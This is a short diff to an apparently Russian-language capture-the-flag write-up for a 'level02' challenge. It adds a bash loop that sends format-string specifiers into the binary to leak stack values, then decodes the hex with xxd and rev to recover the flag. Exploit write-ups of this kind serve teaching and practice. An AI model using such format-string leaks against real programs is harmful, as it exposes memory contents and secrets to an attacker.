@@ -5,4 +5,5 @@
 5. Хитро забираем поинтеры 
 for(( i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 | grep "does not have access"; done
 5. Получаем hex значения строк, надо декодировать их и получим флаг.
+for(( i = 1; i < 30; i++)); do echo "%$i\$p" | ./level02 | grep "does not have access" | xxd -r -p | rev; done
 6. Авторизуемся с полученным флагом
